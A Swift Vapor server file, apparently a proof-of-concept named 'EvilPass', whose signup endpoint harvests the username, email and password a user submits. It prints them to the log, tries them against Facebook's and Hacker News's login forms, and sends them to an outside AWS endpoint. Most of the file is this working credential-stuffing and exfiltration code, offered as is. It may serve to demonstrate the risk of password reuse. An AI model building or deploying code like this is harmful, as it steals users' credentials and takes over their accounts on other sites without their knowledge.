import Vapor
import HTTP

let drop = Droplet()

func checkFB(username: String, email: String, password: String) throws -> Response {
    let facebookResponse = try drop.client.get("https://www.facebook.com")
    let params = try JSON(node:["email": email,
        "pass" : password,
        "legacy_return" :  0,
        "timezone": 480]).makeBytes()

    let postResponse = try drop.client.post("https://www.facebook.com/login.php?login_attempt=1&lwv=100", body: Body(params))
    return postResponse
}

func checkHN(username: String, email: String, password: String) throws -> Response {
    let params = try JSON(node:["goto": "news",
        "pw" : password,
        "acct" :  username]).makeBytes()
    let postResponse = try drop.client.post("https://news.ycombinator.com", body: Body(params))
    return postResponse
}

func checkEvilPass(username: String, email: String, password: String) throws -> Response {
    let params = try JSON(node:["username": username,
        "password" : password,
        "email" :  email]).makeBytes()
    let postResponse = try drop.client.post("https://v5q9hoapkj.execute-api.us-east-1.amazonaws.com/dev/register", body: Body(params))
    return postResponse
}

do {
    drop.middleware.insert(try CORSMiddleware(configuration: drop.config), at: 0)
} catch {
    fatalError("Error creating CORSMiddleware, please check that you've setup cors.json correctly.")
}
drop.post("register") { request in
    print("\(request.json)")
    guard let username = request.json?["username"]?.string else {
        throw Abort.badRequest
    }
    guard let email = request.json?["email"]?.string else {
        throw Abort.badRequest
    }
    guard let password = request.json?["password"]?.string else {
        throw Abort.badRequest
    }

    let facebookResponse = try checkFB(username: username, email: email, password: password)
    let hnResponse = try checkHN(username: username, email: email, password: password)
    let evilResponse = try checkEvilPass(username: username, email: email, password: password)

    let evilData = evilResponse.data["message"]!.string

    return try JSON(node: [
        "message": "\(evilData!)"
    ])
}

drop.resource("posts", PostController())

drop.run()
